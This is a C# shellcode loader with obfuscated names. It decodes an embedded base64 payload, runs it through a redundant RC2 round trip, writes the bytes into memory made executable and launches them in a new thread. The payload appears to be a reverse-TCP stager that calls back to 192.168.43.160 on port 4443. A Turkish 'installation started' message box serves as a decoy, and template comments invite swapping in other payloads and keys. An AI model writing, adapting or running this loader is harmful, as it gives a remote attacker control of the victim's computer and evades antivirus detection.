using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Windows.Forms;

namespace JnSSwffRdKpR
{
    class CHXvHtlPw
    {
        [DllImport("kernel32")] private static extern IntPtr VirtualAlloc(UInt32 VcDNOCr, UInt32 NAFycyVpFfEKf, UInt32 zHVOZgZW, UInt32 cjVfiA);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr VpeKeLmnd, uint CowjNtXGLZqL, uint cnamUIpAdpUrMsM, out uint UwyKnPcdDgqfm);
        [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 LxkyGZrna, UInt32 ZUqGJF, IntPtr ldXoXrAZIqYp, IntPtr mYTTLbBaBIeQLHf, UInt32 cHzTQTzmiQNz, ref UInt32 mmluSfMJKRo);
        [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr oaETDM, UInt32 dyhyOgQMEujvuMy);

        public static byte[] Byte8(string veri)
        {
            char[] ArrayChar = veri.ToCharArray();
            byte[] ArrayByte = new byte[ArrayChar.Length];
            for (int i = 0; i < ArrayChar.Length; i++)
            {
                ArrayByte[i] = Convert.ToByte(ArrayChar[i]);
            }
            return ArrayByte;
        }

        public static string RC2_Sifrele(string strGiris, string key)
        {
            byte[] aryKey = Byte8(key); // Key 8 bytes
            byte[] aryIV = Byte8(key);  // IV should also be 8 bytes
            RC2CryptoServiceProvider dec = new RC2CryptoServiceProvider();
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, dec.CreateEncryptor(aryKey, aryIV), CryptoStreamMode.Write))
                {
                    using (StreamWriter writer = new StreamWriter(cs))
                    {
                        writer.Write(strGiris);
                    }
                }
                return Convert.ToBase64String(ms.ToArray());
            }
        }

        public static string RC2_Coz(string strGiris, string key)
        {
            byte[] aryKey = Byte8(key); // Key 8 bytes
            byte[] aryIV = Byte8(key);  // IV should also be 8 bytes
            RC2CryptoServiceProvider enc = new RC2CryptoServiceProvider();
            using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(strGiris)))
            {
                using (CryptoStream cs = new CryptoStream(ms, enc.CreateDecryptor(aryKey, aryIV), CryptoStreamMode.Read))
                {
                    using (StreamReader reader = new StreamReader(cs))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
        }

        static void Main()
        {
            //paste source code
            string base64Encoded = "MHhmYywweGU4LDB4OGYsMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGQyLDB4NjQsMHg4YiwweDUyLDB4MzAsMHg4YiwweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHg4YiwweDcyLDB4MjgsMHgzMSwweGMwLDB4YWMsMHgzYywweDYxLDB4N2MsMHgwMiwweDJjLDB4MjAsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4NDksMHg3NSwweGVmLDB4NTIsMHg4YiwweDUyLDB4MTAsMHg4YiwweDQyLDB4M2MsMHgwMSwweGQwLDB4OGIsMHg0MCwweDc4LDB4ODUsMHhjMCwweDU3LDB4NzQsMHg0YywweDAxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDhiLDB4NTgsMHgyMCwweDAxLDB4ZDMsMHg4NSwweGM5LDB4NzQsMHgzYywweDMxLDB4ZmYsMHg0OSwweDhiLDB4MzQsMHg4YiwweDAxLDB4ZDYsMHgzMSwweGMwLDB4YzEsMHhjZiwweDBkLDB4YWMsMHgwMSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjQsMHgwMywweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGUwLDB4NTgsMHg4YiwweDU4LDB4MjQsMHgwMSwweGQzLDB4NjYsMHg4YiwweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDU4LDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlOSwweDgwLDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg2OCwweDMzLDB4MzIsMHgwMCwweDAwLDB4NjgsMHg3NywweDczLDB4MzIsMHg1ZiwweDU0LDB4NjgsMHg0YywweDc3LDB4MjYsMHgwNywweGZmLDB4ZDUsMHhiOCwweDkwLDB4MDEsMHgwMCwweDAwLDB4MjksMHhjNCwweDU0LDB4NTAsMHg2OCwweDI5LDB4ODAsMHg2YiwweDAwLDB4ZmYsMHhkNSwweDUwLDB4NTAsMHg1MCwweDUwLDB4NDAsMHg1MCwweDQwLDB4NTAsMHg2OCwweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDk3LDB4ZTgsMHgwZiwweDAwLDB4MDAsMHgwMCwweDMxLDB4MzksMHgzMiwweDJlLDB4MzEsMHgzNiwweDM4LDB4MmUsMHgzNCwweDMzLDB4MmUsMHgzMSwweDM2LDB4MzAsMHgwMCwweDY4LDB4YTksMHgyOCwweDM0LDB4ODAsMHhmZiwweGQ1LDB4OGIsMHg0MCwweDFjLDB4NmEsMHgwYSwweDUwLDB4NjgsMHgwMiwweDAwLDB4MTEsMHg1YiwweDg5LDB4ZTYsMHg2YSwweDEwLDB4NTYsMHg1NywweDY4LDB4OTksMHhhNSwweDc0LDB4NjEsMHhmZiwweGQ1LDB4ODUsMHhjMCwweDc0LDB4MGEsMHhmZiwweDRlLDB4MDgsMHg3NSwweGVjLDB4ZTgsMHhkYywweDAwLDB4MDAsMHgwMCwweDZhLDB4MDAsMHg2YSwweDA0LDB4NTYsMHg1NywweDY4LDB4MDIsMHhkOSwweGM4LDB4NWYsMHhmZiwweGQ1LDB4ODMsMHhmOCwweDAwLDB4N2UsMHg0OSwweDhiLDB4MzYsMHg4MSwweGY2LDB4MTksMHhlYywweDRkLDB4YWQsMHg4ZCwweDhlLDB4MDAsMHgwMSwweDAwLDB4MDAsMHg2YSwweDQwLDB4NjgsMHgwMCwweDEwLDB4MDAsMHgwMCwweDUxLDB4NmEsMHgwMCwweDY4LDB4NTgsMHhhNCwweDUzLDB4ZTUsMHhmZiwweGQ1LDB4OGQsMHg5OCwweDAwLDB4MDEsMHgwMCwweDAwLDB4NTMsMHg1NiwweDUwLDB4NmEsMHgwMCwweDU2LDB4NTMsMHg1NywweDY4LDB4MDIsMHhkOSwweGM4LDB4NWYsMHhmZiwweGQ1LDB4ODMsMHhmOCwweDAwLDB4N2QsMHgyOCwweDU4LDB4NjgsMHgwMCwweDQwLDB4MDAsMHgwMCwweDZhLDB4MDAsMHg1MCwweDY4LDB4MGIsMHgyZiwweDBmLDB4MzAsMHhmZiwweGQ1LDB4NTcsMHg2OCwweDc1LDB4NmUsMHg0ZCwweDYxLDB4ZmYsMHhkNSwweDVlLDB4NWUsMHhmZiwweDBjLDB4MjQsMHgwZiwweDg1LDB4NTEsMHhmZiwweGZmLDB4ZmYsMHhlOSwweDg4LDB4ZmYsMHhmZiwweGZmLDB4MDEsMHhjMywweDI5LDB4YzYsMHg3NSwweGMxLDB4NWIsMHg1OSwweDVkLDB4NTUsMHg1NywweDg5LDB4ZGYsMHhlOCwweDEwLDB4MDAsMHgwMCwweDAwLDB4MmUsMHg2YywweGY5LDB4ODAsMHgwNywweDk4LDB4OTYsMHgwYywweGJjLDB4NjQsMHgwMSwweGIxLDB4ZTksMHg2MiwweGUzLDB4OWQsMHg1ZSwweDMxLDB4YzAsMHhhYSwweGZlLDB4YzAsMHg3NSwweGZiLDB4ODEsMHhlZiwweDAwLDB4MDEsMHgwMCwweDAwLDB4MzEsMHhkYiwweDAyLDB4MWMsMHgwNywweDg5LDB4YzIsMHg4MCwweGUyLDB4MGYsMHgwMiwweDFjLDB4MTYsMHg4YSwweDE0LDB4MDcsMHg4NiwweDE0LDB4MWYsMHg4OCwweDE0LDB4MDcsMHhmZSwweGMwLDB4NzUsMHhlOCwweDMxLDB4ZGIsMHhmZSwweGMwLDB4MDIsMHgxYywweDA3LDB4OGEsMHgxNCwweDA3LDB4ODYsMHgxNCwweDFmLDB4ODgsMHgxNCwweDA3LDB4MDIsMHgxNCwweDFmLDB4OGEsMHgxNCwweDE3LDB4MzAsMHg1NSwweDAwLDB4NDUsMHg0OSwweDc1LDB4ZTUsMHg1ZiwweGMzLDB4YmIsMHhmMCwweGI1LDB4YTIsMHg1NiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDU="; // Your base64 encoded string here
            string decodedString = Encoding.ASCII.GetString(Convert.FromBase64String(base64Encoded));

            // Encrypting with RC2
            string encrypted = RC2_Sifrele(decodedString, "12345678"); // Replace with your actual key

            MessageBox.Show("Yükleme işlemi başlatıldı");

            // Decrypting with RC2 (if needed)
            string decrypted = RC2_Coz(encrypted, "12345678"); // Replace with your actual key
         

            // Memory manipulation code
            string[] chars = decrypted.Split(',').ToArray();
            byte[] TRjIDiwyWS = new byte[chars.Length];
            for (int i = 0; i < chars.Length; ++i) { TRjIDiwyWS[i] = Convert.ToByte(chars[i], 16); }
            IntPtr TCdulTDFAX = VirtualAlloc(0, (UInt32)TRjIDiwyWS.Length, 0x3000, 0x04);
            Marshal.Copy(TRjIDiwyWS, 0, (IntPtr)(TCdulTDFAX), TRjIDiwyWS.Length);
            IntPtr ZUEXoP = IntPtr.Zero; UInt32 zFMndilhU = 0; IntPtr mpIOkgInM = IntPtr.Zero;
            uint gbqnRitgZLxNw;
            bool VXDwurlILFwWx = VirtualProtect(TCdulTDFAX, (uint)0x1000, (uint)0x20, out gbqnRitgZLxNw);
            ZUEXoP = CreateThread(0, 0, TCdulTDFAX, mpIOkgInM, 0, ref zFMndilhU);
            WaitForSingleObject(ZUEXoP, 0xFFFFFFFF);

            // Wait for user input before closing
            Console.WriteLine("Programı kapatmak için bir tuşa basın...");
           
        }
    }
}
